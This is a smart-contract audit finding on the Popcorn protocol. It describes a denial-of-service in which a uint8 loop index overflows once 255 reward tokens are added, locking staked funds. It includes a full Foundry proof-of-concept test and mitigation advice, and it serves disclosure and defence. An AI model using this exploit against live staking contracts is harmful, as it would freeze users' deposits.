## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- selected for report
- sponsor confirmed
- M-32

# [DOS any Staking contract with Arithmetic Overflow](https://github.com/code-423n4/2023-01-popcorn-findings/issues/165) 

# Lines of code

https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L448
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L112
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L127
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L141
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L170
https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L373


# Vulnerability details

## Impact
This allows attackers to disable any Staking contract deployed via the system, essentially locking up all funds within the Staking contract. It would lead to a significant loss of funds for all users and the protocol who have staked their Vault tokens. All Staking contracts can be disabled by an attacker. The attack is possible once vault deployments become permissionless which is the primary goal of the Popcorn protocol. 

## Proof of Concept
The attack is possible because of the following behaviors:
1. Any Vault creator can use any Staking contract that was previously deployed by the system - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110
2. Any Vault creator can add rewards tokens to the Staking contract attached to their Vault. Note that this Staking contract could be the same contract used by other vaults - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L448
3. There are no checks to limit the number of rewardTokens added to a Staking contract - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L263
4. All critical functions in the Staking contract such as withdraw, deposit, transfer and claimRewards automatically call `accrueRewards` modifier.
5. `accrueRewards` iterates through all rewardTokens using a uint8 index variable - https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L373


First, `verifyCreatorOrOwner` needs to be fixed so that it allows either creator or owner to run functions it protects like it's meant to with the below code:

```solidity
if (msg.sender != metadata.creator && msg.sender != owner) revert NotSubmitterNorOwner(msg.sender);
```

Once this fix is implemented and the protocol enables permissionless vault deployment, the following attack path opens up:

1. Some legit vaults have already been deployed by owner of the protocol or others and they have a Staking contract with significant funds
2. Attacker deploys vault using the same Staking contract deployed by any other vault owner/creator. This Staking contract is the target contract to be disabled.
3. Attacker adds 255 reward tokens to the Staking contract to trigger DOS in any future transactions in the Staking contract
4. Calling any transaction function in the Staking will always revert due to arithmetic overflow in the `accrueRewards` modifier that loops over all the `rewardTokens` state variable. The overflow is caused since the `i` variable used in the for loop inside accrueRewards uses uint8 and it keeps looping as long as `i < rewardTokens.length`. That means if `rewardTokens` has a length of 256, it will cause `i` uint8 variable to overflow.

The steps for described attack can be simulated with the below test that will need to be added to the `VaultController.t.sol` test file:

```solidity
  function test__disable_any_staking_contract() public {
    addTemplate("Adapter", templateId, adapterImpl, true, true);
    addTemplate("Strategy", "MockStrategy", strategyImpl, false, true);
    addTemplate("Vault", "V1", vaultImpl, true, true);

    // 1. deploy regular legit vault owned by this
    address vault = deployVault();
    address staking = vaultRegistry.getVault(vault).staking;

    vm.startPrank(alice);
    // 2. deploy attacker-owned vault using the same Staking contract as legit vault
    // alice is the attacker
    address attackerVault = controller.deployVault(
      VaultInitParams({
        asset: iAsset,
        adapter: IERC4626(address(0)),
        fees: VaultFees({
          deposit: 100,
          withdrawal: 200,
          management: 300,
          performance: 400
        }),
        feeRecipient: feeRecipient,
        owner: address(this)
      }),
      DeploymentArgs({ id: templateId, data: abi.encode(uint256(100)) }),
      DeploymentArgs({ id: 0, data: "" }),
      staking,
      "",
      VaultMetadata({
        vault: address(0),
        staking: staking,
        creator: alice,
        metadataCID: metadataCid,
        swapTokenAddresses: swapTokenAddresses,
        swapAddress: address(0x5555),
        exchange: uint256(1)
      }),
      0
    );

    // 3. Attacker (Alice) adds 255 reward tokens to the Staking contract
    bytes[] memory rewardsData = new bytes[](255);
    address[] memory targets = new address[](255);
    for (uint256 i = 0; i < 255; i++) {
      address _rewardToken = address(
        new MockERC20("Reward Token", string(abi.encodePacked(i)), 18)
      );

      targets[i] = attackerVault;
      rewardsData[i] = abi.encode(
        _rewardToken,
        0.1 ether,
        0,
        true,
        10000000,
        2 days,
        1 days
      );
    }
    controller.addStakingRewardsTokens(targets, rewardsData);

    asset.mint(alice, 100 ether);
    asset.approve(vault, 100 ether);
    IVault(vault).deposit(100 ether, alice);
    IVault(vault).approve(staking, 100 ether);

    // 4. This Staking.deposit call or any other transaction will revert due to arithmetic overflow
    // essentially locking all funds in the Staking contract.
    IMultiRewardStaking(staking).deposit(90 ether, alice);
    vm.stopPrank();
  }
```

Please be reminded to fix `verifyCreatorOwner` first before running the above test. Running the test above will cause the call to `Staking.deposit` to revert with an `Arithmetic over/underflow` error which shows that the Staking contract has successfully be DOS'd. The following is the command for running the test:
```
forge test --no-match-contract 'Abstract' --match-test test__disable_any_staking_contract
```


## Tools Used
VSCode, Foundry

## Recommended Mitigation Steps

1. https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110 - users shouldn't be allowed to deploy using just any Staking contract for their vaults. Because of this, any Vault creator can manipulate a Staking contract which leads to the DOS attack path.
2. https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L263 - add a check to limit the number of rewardTokens that can be added to the Staking contract so that it does not grow unbounded.
3. https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L371-L382 - calculation in rewards accrual should be changed so that it does not have to iterate through all rewards tokens. There should be one global index used to keep track of rewards accrual and only that one storage variable will be updated so that gas cost does not increase linearly as more rewardTokens are added.